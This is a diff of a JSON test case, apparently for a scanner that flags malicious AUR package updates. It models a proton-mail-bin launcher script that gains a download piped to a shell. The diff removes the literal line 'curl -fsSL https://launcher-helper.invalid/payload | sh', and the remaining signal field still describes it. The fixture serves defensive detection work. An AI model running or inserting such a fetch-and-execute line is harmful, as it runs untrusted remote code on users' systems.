@@ -2,19 +2,9 @@
   "package": "proton-mail-bin",
   "pkgbase": "proton-mail-bin",
   "old": "1.16.0-1",
-  "new": "1.16.1-1",
   "expect": "flagged",
   "source": "AUR proton-mail-bin commit 14d40f780cc57ed255a01e32858340166b600199, https://aur.archlinux.org/cgit/aur.git/commit/?h=proton-mail-bin&id=14d40f780cc57ed255a01e32858340166b600199; recipe licence: 0BSD (LICENSE in the AUR repository); Models the July 2018 acroread takeover's download piped to a shell (https://lists.archlinux.org/pipermail/aur-general/2018-July/034151.html), relocated into a shipped local source file. The payload host is reserved .invalid and no fetched script is supplied. The cached and fetched PKGBUILD differ only in the launcher checksums; the installed version predates both cached and fetched recipes.",
   "install": "none",
   "installerRisk": false,
-  "recipe": "changed",
-  "signal": "proton-mail.sh adds curl from launcher-helper.invalid piped to sh before launching the application; PKGBUILD changes only the two checksums",
-  "recipeDiffFiles": [
-    ".SRCINFO",
-    "PKGBUILD",
-    "proton-mail.sh"
-  ],
-  "recipeDiffAdded": [
-    "+curl -fsSL https://launcher-helper.invalid/payload | sh"
-  ]
+  "signal": "proton-mail.sh adds curl from launcher-helper.invalid piped to sh before launching the application; PKGBUILD changes only the two checksums"
 }
